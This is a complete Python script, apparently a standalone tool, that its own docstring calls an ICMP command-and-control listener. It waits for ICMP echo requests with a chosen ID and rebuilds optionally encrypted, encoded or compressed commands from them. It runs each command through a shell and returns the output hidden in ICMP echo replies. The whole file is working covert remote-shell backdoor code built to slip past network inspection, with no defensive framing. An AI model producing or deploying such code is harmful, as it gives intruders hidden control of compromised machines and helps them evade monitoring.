#!/usr/bin/env python3
"""
ICMP C2 listener - Enhanced version with more options and better functionality
"""
from scapy.all import sr, IP, ICMP, Raw, sniff, conf
import argparse
import os
import subprocess
import sys
import base64
import zlib
import time
from collections import defaultdict
from cryptography.fernet import Fernet

# Disable Scapy's verbose mode
conf.verb = 0

# Default variables
DEFAULT_ICMP_ID = 13170
DEFAULT_TTL = 64
DEFAULT_CHUNK_SIZE = 500  # bytes

def check_scapy():
    """Verify Scapy is available"""
    try:
        from scapy.all import sr, IP, ICMP, Raw, sniff
    except ImportError:
        print("Install the Py3 scapy module: pip install scapy")
        sys.exit(1)

def check_cryptography():
    """Verify cryptography is available for encryption"""
    try:
        from cryptography.fernet import Fernet
        return True
    except ImportError:
        print("Warning: Install cryptography for encryption: pip install cryptography")
        return False

def encode_data(data, encoding="plain", compression=False):
    """Encode data based on selected method"""
    if encoding == "base64":
        data = base64.b64encode(data.encode()).decode()
    elif encoding == "hex":
        data = data.encode().hex()
    
    if compression:
        data = base64.b64encode(zlib.compress(data.encode())).decode()
    
    return data

def decode_data(data, encoding="plain", compression=False):
    """Decode data based on selected method"""
    if compression:
        try:
            data = zlib.decompress(base64.b64decode(data)).decode()
        except:
            # If decompression fails, try without
            pass
    
    if encoding == "base64":
        data = base64.b64decode(data).decode(errors='ignore')
    elif encoding == "hex":
        data = bytes.fromhex(data).decode(errors='ignore')
    
    return data

class ICMPListener:
    def __init__(self, args):
        self.args = args
        self.icmp_id = args.icmp_id
        self.sequence_num = 0
        self.encryption_enabled = False
        self.chunk_buffers = defaultdict(str)
        self.expected_chunks = defaultdict(int)
        
        # Setup encryption if requested and available
        if args.encrypt and check_cryptography():
            if args.key:
                try:
                    self.cipher = Fernet(args.key.encode())
                    self.encryption_enabled = True
                    print("[+] Encryption enabled")
                except:
                    print("[-] Invalid key format, using plaintext")
            else:
                print("[-] Encryption requested but no key provided")
    
    def encrypt_data(self, data):
        """Encrypt data if encryption is enabled"""
        if self.encryption_enabled:
            return self.cipher.encrypt(data.encode()).decode('latin-1')
        return data
    
    def decrypt_data(self, data):
        """Decrypt data if encryption is enabled"""
        if self.encryption_enabled:
            try:
                return self.cipher.decrypt(data.encode('latin-1')).decode()
            except:
                return f"[DECRYPTION ERROR] {data}"
        return data
    
    def execute_command(self, command):
        """Execute a command and return the result"""
        try:
            # Handle different command types
            if command.strip() == 'ping':
                result = "pong\n"
            else:
                # Execute the command
                proc = subprocess.Popen(
                    command, 
                    shell=True, 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                result = stdout.decode() + stderr.decode()
                
                if not result:
                    result = f"Command executed (exit code: {proc.returncode})\n"
                    
        except Exception as e:
            result = f"Error executing command: {e}\n"
        
        return result
    
    def send_response(self, ip, data):
        """Send response back to client"""
        # Encode and encrypt the data
        encoded_data = encode_data(data, self.args.encoding, self.args.compress)
        encrypted_data = self.encrypt_data(encoded_data)
        
        # Split into chunks if needed
        chunks = [encrypted_data[i:i+self.args.chunk_size] 
                 for i in range(0, len(encrypted_data), self.args.chunk_size)]
        
        # Send each chunk
        for i, chunk in enumerate(chunks):
            payload = (IP(dst=ip, ttl=self.args.ttl)/
                      ICMP(type=0, id=self.icmp_id, seq=self.sequence_num)/
                      Raw(load=f"{i}:{len(chunks)}:{chunk}"))
            
            try:
                sr(payload, timeout=self.args.timeout, verbose=0)
                self.sequence_num = (self.sequence_num + 1) % 65535
                time.sleep(0.1)  # Small delay between packets
            except Exception as e:
                print(f"[-] Error sending response: {e}")
    
    def process_icmp(self, pkt):
        """Process incoming ICMP packets"""
        if (pkt.haslayer(IP) and pkt.haslayer(ICMP) and pkt.haslayer(Raw) and
            pkt[ICMP].type == 8 and 
            pkt[ICMP].id == self.icmp_id):
            
            src_ip = pkt[IP].src
            raw_data = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            try:
                # Handle chunked commands
                if ':' in raw_data:
                    parts = raw_data.split(':', 2)
                    if len(parts) == 3:
                        chunk_num, total_chunks, chunk_data = parts
                        chunk_num = int(chunk_num)
                        total_chunks = int(total_chunks)
                        
                        # Store the chunk
                        self.chunk_buffers[src_ip] += chunk_data
                        self.expected_chunks[src_ip] = total_chunks
                        
                        # If we have all chunks, process the command
                        if chunk_num == total_chunks - 1:
                            # Decrypt and decode the command
                            decrypted_data = self.decrypt_data(self.chunk_buffers[src_ip])
                            command = decode_data(decrypted_data, self.args.encoding, self.args.compress)
                            
                            print(f"[+] Received command from {src_ip}: {command}")
                            
                            # Execute the command
                            result = self.execute_command(command)
                            
                            # Send the response
                            self.send_response(src_ip, result)
                            
                            # Clear the buffer
                            self.chunk_buffers[src_ip] = ""
                            self.expected_chunks[src_ip] = 0
                else:
                    # Single packet command
                    decrypted_data = self.decrypt_data(raw_data)
                    command = decode_data(decrypted_data, self.args.encoding, self.args.compress)
                    
                    print(f"[+] Received command from {src_ip}: {command}")
                    
                    # Execute the command
                    result = self.execute_command(command)
                    
                    # Send the response
                    self.send_response(src_ip, result)
                    
            except Exception as e:
                error_msg = f"Error processing packet: {e}"
                print(f"[-] {error_msg}")
                self.send_response(src_ip, error_msg)
    
    def start(self):
        """Start the ICMP listener"""
        print(f"[+] ICMP C2 listener started on {self.args.interface}")
        print(f"[+] ICMP ID: {self.icmp_id}")
        if self.encryption_enabled:
            print("[+] Encryption: Enabled")
        else:
            print("[+] Encryption: Disabled")
        print("[+] Waiting for commands...")
        
        # Start sniffing
        sniff(iface=self.args.interface, prn=self.process_icmp, 
              filter="icmp", store=0)

def main():
    parser = argparse.ArgumentParser(description="ICMP C2 listener")
    parser.add_argument('-i', '--interface', type=str, required=True, 
                       help="Network Interface (e.g. eth0)")
    parser.add_argument('--icmp-id', type=int, default=DEFAULT_ICMP_ID,
                       help=f"ICMP ID (default: {DEFAULT_ICMP_ID})")
    parser.add_argument('--ttl', type=int, default=DEFAULT_TTL,
                       help=f"IP TTL (default: {DEFAULT_TTL})")
    parser.add_argument('--timeout', type=int, default=2,
                       help="Response timeout in seconds (default: 2)")
    parser.add_argument('--encoding', choices=['plain', 'base64', 'hex'], default='plain',
                       help="Data encoding method (default: plain)")
    parser.add_argument('--compress', action='store_true',
                       help="Enable compression")
    parser.add_argument('--encrypt', action='store_true',
                       help="Enable encryption (requires --key)")
    parser.add_argument('--key', type=str,
                       help="Encryption key (required if --encrypt is used)")
    parser.add_argument('--chunk-size', type=int, default=DEFAULT_CHUNK_SIZE,
                       help=f"Maximum chunk size in bytes (default: {DEFAULT_CHUNK_SIZE})")
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.encrypt and not args.key:
        parser.error("--encrypt requires --key")
    
    # Check dependencies
    check_scapy()
    
    # Start the ICMP listener
    listener = ICMPListener(args)
    listener.start()

if __name__ == "__main__":
    main()
